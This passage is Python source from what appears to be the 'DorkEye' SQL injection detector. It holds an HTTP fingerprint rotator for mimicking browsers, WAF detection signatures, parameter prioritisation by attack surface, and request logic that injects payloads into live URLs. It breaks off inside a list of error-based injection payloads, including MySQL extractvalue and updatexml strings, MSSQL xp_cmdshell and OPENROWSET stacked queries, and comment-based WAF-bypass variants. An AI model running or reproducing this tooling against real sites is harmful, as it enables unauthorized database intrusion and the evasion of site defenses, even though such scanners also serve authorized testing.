"""
DorkEye SQLi Detector
═══════════════════════════════════════════════════════════════
Multi-method SQL injection for DorkEye Project

Contains:
  - SQLiConfidence         enum
  - HTTPFingerprint        dataclass
  - load_http_fingerprints / resolve_reference / resolve_accept_language
  - USER_AGENTS
  - HTTPFingerprintRotator
  - CircuitBreaker
  - _ScriptStripper / _strip_script_tags
  - WAF_SIGNATURES
  - _HIGH_PRIORITY_PARAMS / _MEDIUM_PRIORITY_PARAMS
  - SQLiDetector           (main class)

Author: xPloits3c I.C.W.T | https://github.com/xPloits3c/DorkEye
"""

import os
import re
import sys
import time
import json
import random
import difflib
import statistics
import threading
from dataclasses import dataclass
from enum import Enum
from pathlib import Path
from typing import Dict, List, Optional, Set, Tuple
from urllib.parse import urlparse, parse_qs, urlencode
from html.parser import HTMLParser as _HTMLParser

import requests
import urllib3
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── Interrupt flags — mirrored from dorkeye.py signal handler ────────────────
_exit_requested: bool = False
_skip_current:   bool = False


# ══════════════════════════════════════════════════════════════
#  Termux / Android auto-detection
# ══════════════════════════════════════════════════════════════

def _detect_termux() -> bool:
    """Return True when running inside Termux on Android."""
    return (
        "TERMUX_VERSION" in os.environ
        or os.environ.get("PREFIX", "").startswith("/data/data/com.termux")
        or os.path.isdir("/data/data/com.termux")
    )

TERMUX_IS_ANDROID: bool = _detect_termux()


# ══════════════════════════════════════════════════════════════
#  Interruptible sleep
# ══════════════════════════════════════════════════════════════

def _interruptible_sleep(seconds: float, step: float = 0.25) -> None:
    """Sleep in small steps; return immediately if an interrupt flag is set."""
    elapsed = 0.0
    while elapsed < seconds:
        if _exit_requested or _skip_current:
            return
        time.sleep(min(step, seconds - elapsed))
        elapsed += step


# ══════════════════════════════════════════════════════════════
#  SQLiConfidence
# ══════════════════════════════════════════════════════════════

class SQLiConfidence(Enum):
    """Confidence levels for SQL injection findings."""
    NONE     = "none"
    LOW      = "low"
    MEDIUM   = "medium"
    HIGH     = "high"
    CRITICAL = "critical"


# ══════════════════════════════════════════════════════════════
#  HTTPFingerprint dataclass
# ══════════════════════════════════════════════════════════════

@dataclass
class HTTPFingerprint:
    """Immutable snapshot of a browser HTTP fingerprint."""
    browser:         str
    os:              str
    user_agent:      str
    accept_language: str
    accept_encoding: str
    accept:          str
    referer:         str
    sec_fetch_dest:  str
    sec_fetch_mode:  str
    sec_fetch_site:  str
    cache_control:   str


# ══════════════════════════════════════════════════════════════
#  HTTP Fingerprinting helpers
# ══════════════════════════════════════════════════════════════

def load_http_fingerprints() -> Dict:
    """Load http_fingerprints.json; return a dict tagged with _mode."""
    fingerprint_file = Path(__file__).parent.parent / "http_fingerprints.json"
    try:
        with open(fingerprint_file, "r", encoding="utf-8") as f:
            data = json.load(f)
        if not isinstance(data, dict) or not data:
            raise ValueError("Fingerprint file is empty or invalid")
        if "fingerprints" in data:
            return {
                "_mode":             "advanced",
                "_meta":             data.get("_meta", {}),
                "fingerprints":      data.get("fingerprints", {}),
                "language_profiles": data.get("language_profiles", {}),
                "common_headers":    data.get("common_headers", {})
            }
        return {"_mode": "legacy", "fingerprints": data}
    except Exception as e:
        print(f"[sqli] Warning: failed to load HTTP fingerprints: {e}", file=sys.stderr)
        print("[sqli] HTTP fingerprinting will be disabled", file=sys.stderr)
        return {"_mode": "disabled"}


def resolve_reference(value: str, common_headers: Dict) -> str:
    """Resolve a @reference token to its value in common_headers."""
    if isinstance(value, str) and value.startswith("@"):
        key = value[1:]
        return common_headers.get(key, "")
    return value


def resolve_accept_language(fp_headers: Dict, language_profiles: Dict) -> str:
    """Pick a random language profile and return the matching Accept-Language string."""
    profiles = fp_headers.get("accept_language_profiles")
    if not profiles:
        return ""
    profile = random.choice(profiles)
    return language_profiles.get(profile, "")


# ══════════════════════════════════════════════════════════════
#  User-Agent pool
# ══════════════════════════════════════════════════════════════

USER_AGENTS: Dict[str, List[str]] = {
    "chrome": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    ],
    "firefox": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    ],
    "safari": [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 "
        "(KHTML, like Gecko) Version/17.1 Safari/605.1.15",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 "
        "(KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    ],
    "edge": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    ],
}


# ══════════════════════════════════════════════════════════════
#  HTTPFingerprintRotator
# ══════════════════════════════════════════════════════════════

class HTTPFingerprintRotator:
    """Rotates browser fingerprint profiles on every request."""

    def __init__(self):
        self.raw_fingerprints    = load_http_fingerprints()
        self.fingerprints        = self._build_fingerprints()
        self.current_index       = 0
        self.current_fingerprint = None

    def _build_fingerprints(self) -> List[HTTPFingerprint]:
        fingerprints: List[HTTPFingerprint] = []
        mode = self.raw_fingerprints.get("_mode")

        if mode == "legacy":
            for fp_data in self.raw_fingerprints.get("fingerprints", {}).values():
                try:
                    fingerprints.append(HTTPFingerprint(
                        browser         = fp_data["browser"],
                        os              = fp_data["os"],
                        user_agent      = fp_data["user_agent"],
                        accept_language = fp_data["accept_language"],
                        accept_encoding = fp_data["accept_encoding"],
                        accept          = fp_data["accept"],
                        referer         = "",
                        sec_fetch_dest  = fp_data["sec_fetch_dest"],
                        sec_fetch_mode  = fp_data["sec_fetch_mode"],
                        sec_fetch_site  = fp_data["sec_fetch_site"],
                        cache_control   = fp_data["cache_control"],
                    ))
                except KeyError:
                    continue
            return fingerprints

        if mode == "advanced":
            language_profiles = self.raw_fingerprints.get("language_profiles", {})
            common_headers    = self.raw_fingerprints.get("common_headers", {})
            fps               = self.raw_fingerprints.get("fingerprints", {})
            for fp in fps.values():
                try:
                    headers   = fp.get("headers", {})
                    sec_fetch = headers.get("sec_fetch", {})
                    fingerprints.append(HTTPFingerprint(
                        browser         = fp.get("browser", ""),
                        os              = fp.get("os", ""),
                        user_agent      = fp.get("user_agent", ""),
                        accept_language = resolve_accept_language(headers, language_profiles),
                        accept_encoding = resolve_reference(headers.get("accept_encoding", ""), common_headers),
                        accept          = resolve_reference(headers.get("accept", ""), common_headers),
                        referer         = "",
                        sec_fetch_dest  = sec_fetch.get("dest", "document"),
                        sec_fetch_mode  = sec_fetch.get("mode", "navigate"),
                        sec_fetch_site  = sec_fetch.get("site", "none"),
                        cache_control   = resolve_reference(headers.get("cache_control", ""), common_headers),
                    ))
                except Exception:
                    continue

        return fingerprints

    def get_random(self) -> Optional[HTTPFingerprint]:
        self.current_fingerprint = random.choice(self.fingerprints) if self.fingerprints else None
        return self.current_fingerprint

    def get_next(self) -> Optional[HTTPFingerprint]:
        if not self.fingerprints:
            return None
        self.current_fingerprint = self.fingerprints[self.current_index]
        self.current_index       = (self.current_index + 1) % len(self.fingerprints)
        return self.current_fingerprint

    def build_headers(self, referer: str = "") -> Dict[str, str]:
        if not self.current_fingerprint:
            return {"User-Agent": "Mozilla/5.0", "Accept": "*/*", "Connection": "keep-alive"}
        headers = {
            "User-Agent":                self.current_fingerprint.user_agent,
            "Accept":                    self.current_fingerprint.accept,
            "Accept-Language":           self.current_fingerprint.accept_language,
            "Accept-Encoding":           self.current_fingerprint.accept_encoding,
            "Sec-Fetch-Dest":            self.current_fingerprint.sec_fetch_dest,
            "Sec-Fetch-Mode":            self.current_fingerprint.sec_fetch_mode,
            "Sec-Fetch-Site":            self.current_fingerprint.sec_fetch_site,
            "Cache-Control":             self.current_fingerprint.cache_control,
            "Pragma":                    "no-cache",
            "DNT":                       "1",
            "Connection":                "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        }
        if referer:
            headers["Referer"] = referer
        return headers


# ══════════════════════════════════════════════════════════════
#  CircuitBreaker
# ══════════════════════════════════════════════════════════════

class CircuitBreaker:
    """Tracks unreachable hosts and short-circuits further requests."""

    def __init__(self):
        self._dead: Set[str] = set()

    def _key(self, url: str) -> str:
        p = urlparse(url)
        return f"{p.scheme}://{p.netloc}"

    def is_dead(self, url: str) -> bool:
        return self._key(url) in self._dead

    def mark_dead(self, url: str) -> None:
        self._dead.add(self._key(url))

    def reset(self) -> None:
        self._dead.clear()


# ══════════════════════════════════════════════════════════════
#  HTMLParser-based script-tag stripper
# ══════════════════════════════════════════════════════════════

class _ScriptStripper(_HTMLParser):
    """HTMLParser subclass that removes every <script>…</script> block."""

    def __init__(self):
        super().__init__(convert_charrefs=False)
        self._in_script: int = 0
        self._parts: list   = []

    def handle_starttag(self, tag, attrs):
        if tag.lower() == "script":
            self._in_script += 1

    def handle_endtag(self, tag):
        if tag.lower() == "script" and self._in_script:
            self._in_script -= 1

    def handle_data(self, data):
        if not self._in_script:
            self._parts.append(data)

    def handle_entityref(self, name):
        if not self._in_script:
            self._parts.append(f"&{name};")

    def handle_charref(self, name):
        if not self._in_script:
            self._parts.append(f"&#{name};")

    def get_result(self) -> str:
        return "".join(self._parts)


_SCRIPT_TAG_RE_FALLBACK = re.compile(
    r"<script(?:[^>]*)>[\s\S]*?</script\s*>", re.IGNORECASE
)


def _strip_script_tags(body: str) -> str:
    """Return body with all <script> blocks removed."""
    stripper = _ScriptStripper()
    try:
        stripper.feed(body)
        stripper.close()
        return stripper.get_result()
    except Exception:
        return _SCRIPT_TAG_RE_FALLBACK.sub("", body)


# ══════════════════════════════════════════════════════════════
#  WAF detection signatures
# ══════════════════════════════════════════════════════════════

WAF_SIGNATURES: Dict[str, List[str]] = {
    "cloudflare":  ["cf-ray", "__cfduid", "cloudflare", "attention required! | cloudflare"],
    "modsecurity": ["mod_security", "modsecurity", "406 not acceptable", "not acceptable!"],
    "wordfence":   ["wordfence", "generated by wordfence"],
    "sucuri":      ["x-sucuri-id", "sucuri website firewall", "access denied - sucuri"],
    "imperva":     ["x-iinfo", "incapsula incident", "_incap_ses_"],
    "akamai":      ["akamai", "x-akamai-transformed", "reference #18"],
    "f5_bigip":    ["x-waf-event-info", "bigipserver", "the requested url was rejected"],
    "barracuda":   ["barra_counter_session", "barracuda"],
    "fortiweb":    ["fortigate", "fortiweb"],
    "aws_waf":     ["x-amzn-requestid", "awselb", "forbidden - aws waf"],
    "denyall":     ["denyall", "x-denyall"],
    "reblaze":     ["x-reblaze-protection"],
}


# ══════════════════════════════════════════════════════════════
#  Parameter priority tables
# ══════════════════════════════════════════════════════════════

_HIGH_PRIORITY_PARAMS: frozenset = frozenset({
    "id", "pid", "uid", "nid", "tid", "cid", "rid", "eid", "fid", "gid",
    "page", "pg", "p", "num", "item", "product", "prod", "article",
    "cat", "category", "sort", "order", "by", "type", "idx", "index",
    "ref", "record", "row", "entry", "post", "news", "view",
})

_MEDIUM_PRIORITY_PARAMS: frozenset = frozenset({
    "search", "q", "query", "s", "keyword", "kw", "term", "find",
    "name", "user", "username", "login", "email", "mail",
    "city", "country", "region", "lang", "language",
    "filter", "tag", "label", "topic", "subject", "section",
})


# ══════════════════════════════════════════════════════════════
#  SQLiDetector — timing constants (Termux-aware)
# ══════════════════════════════════════════════════════════════

_CONNECT_TIMEOUT  = 3 if TERMUX_IS_ANDROID else 4
_DEFAULT_READ     = 6 if TERMUX_IS_ANDROID else 8
_TIMEBASED_MARGIN = 2.5
_SLEEP_DELAY      = 3
_BASELINE_SAMPLES = 1 if TERMUX_IS_ANDROID else 2
_MAX_BASELINE_S   = 6.0

_PROBE_SAMPLES       = 2 if TERMUX_IS_ANDROID else 3
_PROBE_NOISE_BUFFER  = 0.04
_PROBE_MAX_THRESHOLD = 0.18
_PROBE_SAMPLE_BYTES  = 8_192   # [NEW-7] cap for difflib comparison
_BOOL_SAMPLES        = 2 if TERMUX_IS_ANDROID else 3
_TIMEBASED_CONFIRM   = 1 if TERMUX_IS_ANDROID else 2
_UNION_COLUMNS_MAX   = 6       # raised from 5 — most real apps use ≤6 cols

# ── [FP-1] Page-stability threshold ──────────────────────────────────────────
# Minimum similarity between two clean requests to consider the page stable
# enough for boolean-blind testing. Below this → boolean blind is skipped.
_PAGE_STABILITY_MIN  = 0.82

# ── [FP-7] Probe fast-path threshold ─────────────────────────────────────────
# Raised from 50 → 150 bytes: small deltas (timestamps, nonces, ad counters)
# were triggering unnecessary full-suite runs on every dynamic parameter.
_FP_FAST_PATH_BYTES  = 150


# ══════════════════════════════════════════════════════════════
#  SQLiDetector
# ══════════════════════════════════════════════════════════════

class SQLiDetector:
    """
    Multi-method SQL injection detector that tests GET/POST/JSON/path parameters.

    Detection methods (run in order per parameter):
      1. error_based      — injects payloads that trigger DB error signatures
      2. union_based      — probes column count (NULL + string columns)
      3. boolean_blind    — dual-metric: length diff + similarity ratio
      4. time_based_blind — DB-specific SLEEP/pg_sleep/WAITFOR payloads
      5. stacked_query    — lightweight stacked-query probe (new)

    Parameters are prioritised by attack surface before testing.
    A CircuitBreaker skips further requests to hosts that became unreachable.
    """

    # ── [NEW-2] Extended SQL error signatures ─────────────────────────────────
    SQL_ERROR_SIGNATURES = {
        "mysql": [
            r"You have an error in your SQL syntax",
            r"Warning.*mysqli?_",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"mysql_num_rows\(\)",
            r"mysql_fetch_(?:array|assoc|row|object)",
            r"MySQL server version for the right syntax",
            r"com\.mysql\.jdbc\.exceptions",
            # [NEW-2] additional MySQL patterns
            r"Table '.*' doesn't exist",
            r"Unknown column '.*' in 'field list'",
            r"FUNCTION .* does not exist",
            r"Subquery returns more than 1 row",
        ],
        "postgresql": [
            r"PostgreSQL.*ERROR",
            r"Warning.*\bpg_",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"org\.postgresql\.util\.PSQLException",
            r"ERROR:\s+syntax error at or near",
            r"ERROR:\s+unterminated quoted string",
            # [NEW-2] additional PostgreSQL patterns
            r"PG::SyntaxError",
            r"pg_query\(\):",
            r"ERROR:\s+invalid input syntax for",
        ],
        "mssql": [
            r"Driver.*SQL[\-\_\ ]*Server",
            r"OLE DB.*SQL Server",
            r"SQLServer JDBC Driver",
            r"Microsoft SQL Native Client error",
            r"ODBC SQL Server Driver",
            r"Unclosed quotation mark after the character string",
            r"Microsoft OLE DB Provider for SQL Server",
            r"\[Microsoft\]\[ODBC SQL Server Driver\]",
            r"Incorrect syntax near",
            # [NEW-2] additional MSSQL patterns
            r"SqlException",
            r"System\.Data\.SqlClient",
            r"Procedure or function .* expects parameter",
        ],
        "sqlite": [
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"System\.Data\.SQLite\.SQLiteException",
            r"sqlite3\.OperationalError:",
            r"near \".*\": syntax error",
            # [NEW-2] additional SQLite patterns
            r"unrecognized token:",
            r"incomplete input",
        ],
        "oracle": [
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*\boci_",
            r"ORA-\d{5}",
            r"oracle\.jdbc\.driver",
            r"quoted string not properly terminated",
            # [NEW-2] additional Oracle patterns
            r"PLS-\d{5}",
            r"TNS:\s+",
        ],
        # [NEW-2] Generic bucket — catches miscellaneous DB frameworks
        "generic": [
            r"syntax error.*near",
            r"unexpected end of SQL command",
            r"unterminated string literal",
            r"SQL command not properly ended",
            r"invalid use of null",
            r"data type mismatch",
        ],
    }

    _UNION_COL_MISMATCH_RE = re.compile(
        r"(The used SELECT statements have a different number of columns"
        r"|each UNION query must have the same number of columns"
        r"|SELECTs to the left and right of UNION do not have the same number"
        r"|ORA-01789"
        r"|column count doesn.t match)",
        re.IGNORECASE,
    )

    def __init__(self, stealth: bool = False, timeout: int = _DEFAULT_READ,
                 proxy: str = None):
        """Initialise with stealth flag, timeout, fingerprint rotator, circuit breaker."""
        self.stealth             = stealth
        self.read_timeout        = timeout
        self.proxy               = proxy
        self.circuit_breaker     = CircuitBreaker()
        self.fingerprint_rotator = HTTPFingerprintRotator()
        self._session            = self._build_session()
        self._status_cb          = None

    def _cb(self, msg: str) -> None:
        """Send a phase/status message to the registered callback."""
        if callable(self._status_cb):
            try:
                self._status_cb(msg)
            except Exception:
                pass

    def _build_session(self) -> requests.Session:
        session = requests.Session()
        retry   = Retry(
            total            = 2,
            backoff_factor   = 0.5,
            status_forcelist = [429, 500, 502, 503, 504],
            allowed_methods  = ["GET", "POST"],
            raise_on_status  = False,
        )
        adapter = HTTPAdapter(max_retries=retry)
        session.mount("http://",  adapter)
        session.mount("https://", adapter)
        if getattr(self, "proxy", None):
            session.proxies.update({"http": self.proxy, "https": self.proxy})
        return session

    def _timeout(self, extra_read: float = 0) -> Tuple[int, float]:
        return (_CONNECT_TIMEOUT, self.read_timeout + extra_read)

    def _run_interruptible(self, fn, total_timeout: float, on_connect_error=None):
        """Run fn() in a daemon thread; return result or None on timeout/interrupt."""
        _POLL         = 0.1
        result_holder = [None]
        exc_holder    = [None]
        done_event    = threading.Event()

        def _worker():
            try:
                result_holder[0] = fn()
            except (requests.exceptions.ConnectTimeout,
                    requests.exceptions.ConnectionError) as e:
                exc_holder[0] = e
            except Exception:
                pass
            finally:
                done_event.set()

        threading.Thread(target=_worker, daemon=True).start()

        deadline = total_timeout + 1.0
        elapsed  = 0.0
        while elapsed < deadline:
            if _exit_requested or _skip_current:
                return None
            if done_event.wait(timeout=_POLL):
                if exc_holder[0] is not None and on_connect_error:
                    on_connect_error()
                return result_holder[0]
            elapsed += _POLL

        return None

    def _get(self, url: str, extra_read: float = 0) -> Optional[requests.Response]:
        """Perform a GET request with rotated fingerprint; return Response or None."""
        if self.circuit_breaker.is_dead(url):
            return None

        self.fingerprint_rotator.get_random()
        headers = self.fingerprint_rotator.build_headers()
        timeout = self._timeout(extra_read)

        def _do():
            return self._session.get(
                url,
                headers         = headers,
                timeout         = timeout,
                verify          = False,
                allow_redirects = True,
            )

        total = _CONNECT_TIMEOUT + self.read_timeout + extra_read
        return self._run_interruptible(
            _do,
            total_timeout    = total,
            on_connect_error = lambda: self.circuit_breaker.mark_dead(url),
        )

    def _post(
        self,
        url:     str,
        data:    Optional[Dict] = None,
        json_body: Optional[Dict] = None,
    ) -> Optional[requests.Response]:
        """Perform a POST (form or JSON) with rotated fingerprint; return Response or None."""
        if self.circuit_breaker.is_dead(url):
            return None

        self.fingerprint_rotator.get_random()
        headers = self.fingerprint_rotator.build_headers()
        timeout = self._timeout()

        if json_body is not None:
            def _do():
                return self._session.post(
                    url, json=json_body, headers=headers,
                    timeout=timeout, verify=False,
                )
        else:
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            def _do():
                return self._session.post(
                    url, data=data or {}, headers=headers,
                    timeout=timeout, verify=False,
                )

        total = _CONNECT_TIMEOUT + self.read_timeout
        return self._run_interruptible(
            _do,
            total_timeout    = total,
            on_connect_error = lambda: self.circuit_breaker.mark_dead(url),
        )

    # ──────────────────────────────────────────────────────────
    #  WAF Detection
    # ──────────────────────────────────────────────────────────

    def _detect_waf(self, response: requests.Response) -> Optional[str]:
        """Scan response headers and body for WAF signatures; return name or None."""
        headers_keys   = {k.lower() for k in response.headers}
        headers_values = " ".join(v.lower() for v in response.headers.values())
        body_snippet   = response.text[:2000].lower()

        for waf_name, sigs in WAF_SIGNATURES.items():
            for sig in sigs:
                if sig in headers_keys or sig in headers_values or sig in body_snippet:
                    return waf_name

        if response.status_code in (403, 406, 419, 429) and len(response.text) < 600:
            return "generic_waf"

        return None

    def _measure_baseline_latency(self, url: str) -> Optional[float]:
        """Measure average response latency over _BASELINE_SAMPLES; return or None."""
        times = []
        for _ in range(_BASELINE_SAMPLES):
            if self.circuit_breaker.is_dead(url):
                return None
            if _exit_requested or _skip_current:
                return None
            t0       = time.monotonic()
            response = self._get(url)
            elapsed  = time.monotonic() - t0
            if response is None:
                return None
            times.append(elapsed)
            _interruptible_sleep(0.3)
        baseline = sum(times) / len(times)
        if baseline > _MAX_BASELINE_S:
            return None
        return baseline

    def has_query_params(self, url: str) -> bool:
        """Return True if the URL contains at least one GET query parameter."""
        try:
            return bool(parse_qs(urlparse(url).query))
        except Exception:
            return False

    def _extract_query_params(self, url: str) -> Dict[str, str]:
        """Parse and return all GET query params as a flat {name: first_value} dict."""
        try:
            params = parse_qs(urlparse(url).query)
            return {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
        except Exception:
            return {}

    def _inject_payload(self, url: str, param_name: str, payload: str) -> str:
        """Return url with param_name replaced by payload. Preserves fragment."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if param_name not in params:
            return url
        params[param_name] = [payload]
        new_query = urlencode(params, doseq=True)
        rebuilt = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
        if parsed.fragment:
            rebuilt += f"#{parsed.fragment}"
        return rebuilt

    def _get_baseline_response(self, url: str) -> Optional[Tuple[int, str, int]]:
        """Fetch baseline; return (status_code, body_text, body_len) or None."""
        response = self._get(url)
        if response is None:
            return None
        return (response.status_code, response.text, len(response.text))

    def _match_sql_errors(self, body: str) -> Optional[Tuple[str, str]]:
        """Strip script tags then scan for SQL error signatures; return (db, pattern) or None."""
        clean_body = _strip_script_tags(body)
        for db_type, patterns in self.SQL_ERROR_SIGNATURES.items():
            for pattern in patterns:
                if re.search(pattern, clean_body, re.IGNORECASE):
                    return (db_type, pattern)
        return None

    # ──────────────────────────────────────────────────────────
    #  Parameter prioritisation
    # ──────────────────────────────────────────────────────────

    def _prioritize_params(self, params: Dict[str, str]) -> List[str]:
        """Sort params into high/medium/low priority; return concatenated list."""
        high:   List[str] = []
        medium: List[str] = []
        low:    List[str] = []

        for param, value in params.items():
            p_lower = param.lower()
            if value.isdigit() or p_lower in _HIGH_PRIORITY_PARAMS:
                high.append(param)
            elif p_lower in _MEDIUM_PRIORITY_PARAMS:
                medium.append(param)
            else:
                low.append(param)

        return high + medium + low

    # ──────────────────────────────────────────────────────────
    #  [NEW-7] Parameter probe — fast-path + 8 KB cap
    # ──────────────────────────────────────────────────────────

    def _probe_parameter(self, url: str, param_name: str, baseline_content: str) -> bool:
        """
        Return True if the parameter shows meaningful variation when injected with a quote.

        [NEW-7] Two performance improvements vs v4.9.0:
          - Fast-path: if any response body differs from baseline by >50 bytes,
            declare variation immediately without running difflib.
          - difflib comparison capped at first _PROBE_SAMPLE_BYTES (8 KB) of each
            body — same approach used in xss.py; prevents O(n²) on large pages.
        """
        if self.circuit_breaker.is_dead(url):
            return False

        r_init = self._get(url)
        if r_init is None:
            return False

        baseline_status: int       = r_init.status_code

        # [FP-7] Fast-path threshold raised to _FP_FAST_PATH_BYTES (150 B).
        # The old 50-byte threshold was too easily hit by timestamps, nonces,
        # and counter values embedded in the page body.
        if abs(len(baseline_content) - len(r_init.text)) > _FP_FAST_PATH_BYTES:
            # Still build noise baseline — just mark this sample as noisy
            noise_samples: List[float] = [0.05]
        else:
            b1  = baseline_content[: _PROBE_SAMPLE_BYTES]
            b2  = r_init.text[: _PROBE_SAMPLE_BYTES]
            first_sim                  = difflib.SequenceMatcher(None, b1, b2).ratio()
            noise_samples: List[float] = [1.0 - first_sim]

        for _ in range(_PROBE_SAMPLES - 1):
            if _exit_requested or _skip_current:
                return False
            r = self._get(url)
            if r is None:
                return False
            if abs(len(baseline_content) - len(r.text)) > _FP_FAST_PATH_BYTES:
                noise_samples.append(0.05)
            else:
                b1  = baseline_content[: _PROBE_SAMPLE_BYTES]
                b2  = r.text[: _PROBE_SAMPLE_BYTES]
                sim = difflib.SequenceMatcher(None, b1, b2).ratio()
                noise_samples.append(1.0 - sim)
            _interruptible_sleep(0.2)

        noise_level = statistics.median(noise_samples)

        if noise_level > _PROBE_MAX_THRESHOLD:
            return False

        adaptive_threshold = noise_level + _PROBE_NOISE_BUFFER

        if _exit_requested or _skip_current:
            return False

        test_url  = self._inject_payload(url, param_name, "1'")
        r_payload = self._get(test_url)
        if r_payload is None:
            return False

        if r_payload.status_code != baseline_status:
            return False

        if abs(len(baseline_content) - len(r_payload.text)) > _FP_FAST_PATH_BYTES:
            return True

        b1           = baseline_content[: _PROBE_SAMPLE_BYTES]
        b2           = r_payload.text[: _PROBE_SAMPLE_BYTES]
        payload_noise = 1.0 - difflib.SequenceMatcher(None, b1, b2).ratio()

        return payload_noise > adaptive_threshold

    # ──────────────────────────────────────────────────────────
    #  [FP-1] Page-stability pre-check
    # ──────────────────────────────────────────────────────────

    def _check_page_stability(self, url: str) -> float:
        """
        Fetch url twice with no injection and measure content similarity.
        Returns a ratio in [0.0, 1.0]:  1.0 = identical, 0.0 = completely
        different.

        [FP-1] Inspired by sqlmap's checkStability(): dynamic pages (ads,
        rotating content, timestamps) produce constant natural variation that
        is indistinguishable from boolean-blind SQLi signals. If stability
        falls below _PAGE_STABILITY_MIN the caller should skip boolean blind.
        """
        r1 = self._get(url)
        if r1 is None:
            return 0.0
        _interruptible_sleep(0.4)
        r2 = self._get(url)
        if r2 is None:
            return 0.0
        b1 = r1.text[:_PROBE_SAMPLE_BYTES]
        b2 = r2.text[:_PROBE_SAMPLE_BYTES]
        return difflib.SequenceMatcher(None, b1, b2).ratio()

    # ──────────────────────────────────────────────────────────
    #  [FP-2] Baseline SQL-error guard
    # ──────────────────────────────────────────────────────────

    def _baseline_has_sql_errors(self, url: str) -> bool:
        """
        Return True if the CLEAN url already contains SQL error signatures.

        [FP-2] Apps running in debug mode, broken queries in the backend, or
        verbose ORMs can emit SQL error text on every request. Running the
        error-based suite against such targets will always match, producing
        100% false positives. This guard detects that condition before any
        injection payload is sent.
        """
        r = self._get(url)
        if r is None:
            return False
        return self._match_sql_errors(r.text) is not None

    # ──────────────────────────────────────────────────────────
    #  [1] Error-based — [NEW-1] expanded payload set
    # ──────────────────────────────────────────────────────────

    def _test_error_based(self, url: str, param_name: str) -> Dict:
        """
        Inject error-based payloads and look for DB error signatures.

        [NEW-1] Expanded from 3 to 22 payloads covering all 5 DB engines
        plus 4 WAF-bypass comment variants.
        """
        result = {
            "method":     "error_based",
            "vulnerable": False,
            "confidence": SQLiConfidence.NONE.value,
            "evidence":   [],
            "waf":        None,
        }

        # ── [FP-2] Baseline SQL-error guard ──────────────────────────────────
        # If the clean page already shows SQL errors, every payload will match
        # → guaranteed false positives. Skip entirely.
        if self._baseline_has_sql_errors(url):
            result["evidence"].append(
                "[FP-guard] SQL error signatures found in clean baseline — "
                "error-based test skipped to avoid false positives"
            )
            return result

        # ── [NEW-1] Full payload set ──────────────────────────────────────────
        payloads = [
            # ── MySQL / MariaDB ───────────────────────────────────────────────
            # extractvalue — triggers XPATH error with payload content
            "1' AND extractvalue(0,concat(0x7e,'TEST',0x7e)) AND '1'='1",
            "1 AND extractvalue(0,concat(0x7e,'TEST',0x7e))",
            # updatexml — alternative XPATH error vector
            "1' AND updatexml(0,concat(0x7e,'TEST'),0) AND '1'='1",
            # floor/rand GROUP BY — classic MySQL error-based
            (
                "1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e,'TEST',"
                "0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)"
            ),
            # Double query via subselect
            "1 AND (SELECT * FROM(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x"
            " FROM information_schema.tables GROUP BY x)a)",

            # ── Microsoft SQL Server ──────────────────────────────────────────
            # CAST to int causes type-conversion error
            "1 AND 1=CAST(CONCAT(0x7e,'TEST',0x7e) AS INT)",
            "1' AND 1=CONVERT(int,(SELECT TOP 1 'TEST'))--",
            # xp_cmdshell — triggers permission/feature error that leaks DB context
            "1'; EXEC xp_cmdshell('TEST')--",
            # OPENROWSET error
            "1'; SELECT * FROM OPENROWSET('SQLOLEDB','TEST','')--",

            # ── PostgreSQL ────────────────────────────────────────────────────
            "1 AND 1=CAST('TEST' AS INT)",
            "1' AND 1=CAST(version() AS INT)--",
            # pg_sleep(0) — triggers function error on non-PG targets
            "1; SELECT pg_sleep(0)--",

            # ── Oracle ────────────────────────────────────────────────────────
            "1' AND 1=CAST((SELECT 'TEST' FROM dual) AS INT)--",
            "1 AND 1=(SELECT UPPER(XMLType(chr(60)||chr(58)||'TEST'||chr(62))) FROM dual)",

            # ── Generic / agnostic ────────────────────────────────────────────
            "1'; SELECT NULL--",
            "1'; SELECT NULL#",
            "1\"--",
            "1'--",
            # Stacked with sleep(0) — often reveals stacked-query capability
            "1'; SELECT SLEEP(0)--",
            "1'; WAITFOR DELAY '0:0:0'--",

            # ── [NEW-1] WAF-bypass comment variants ───────────────────────────
            # Inline MySQL comments break simple keyword filters
            "1'/**/AND/**/extractvalue(0,concat(0x7e,'TEST',0x7e))/**/AND/**/'1'='1",
            # MySQL conditional comment (/*! ... */) — executes only on MySQL
            "1'/*!AND*/extractvalue(0,concat(0x7e,'TEST',0x7e))/*!AND*/'1'='1",
            # URL-encoded quote + space — bypasses WAFs that decode lazily
            "1%27%20AND%20extractvalue(0,concat(0x7e,%27TEST%27,0x7e))%20AND%20%271%27=%271",
